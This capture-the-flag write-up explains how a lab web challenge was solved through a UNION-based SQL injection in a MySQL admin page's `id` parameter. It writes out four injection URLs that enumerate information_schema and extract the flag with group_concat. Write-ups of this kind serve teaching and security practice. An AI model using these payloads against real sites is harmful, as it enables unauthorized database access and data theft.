# Web 200 - URL Anonymizer

> Writeup by f0xtr0t (Jay Bosamiya)

One of the different admin pages (namely, `report`), was vulnerable to an SQL injection from the `id` parameter. This allowed us to leak one value of one column of information directly to the output.

Additionally, it was easy to notice that it was using MySQL. Hence, we could use the different "special tables" in MySQL with a `UNION SELECT` based query and obtain information.

The most irritating part of this process was finding the number of columns in the union select attack, since (for some reason), my extensions on Firefox were messing up, and I was constantly forced to manually keep running URLencode and URLdecode :(

Nevertheless, using `group_concat()`, it is possible to obtain all entries in a column, as a single row, and we used that to obtain information in a very fast way.

Without further ado, here are the different queries that were run (URLdecoded versions, for easier reading):

```
http://10.13.37.12/admin.php?page=report&id=asd" UNION SELECT 0,1,2,3 -- 

http://10.13.37.12/admin.php?page=report&id=asd" UNION SELECT 0,1,group_concat(table_name),3 FROM information_schema.tables where table_schema="web" -- 

http://10.13.37.12/admin.php?page=report&id=asd" UNION SELECT 0,1,group_concat(column_name),3 FROM information_schema.columns where table_schema="web" -- 

http://10.13.37.12/admin.php?page=report&id=asd" UNION SELECT 0,1,group_concat(flag),3 FROM flag -- 
```

The `flag` column in the `flag` table had the flag :)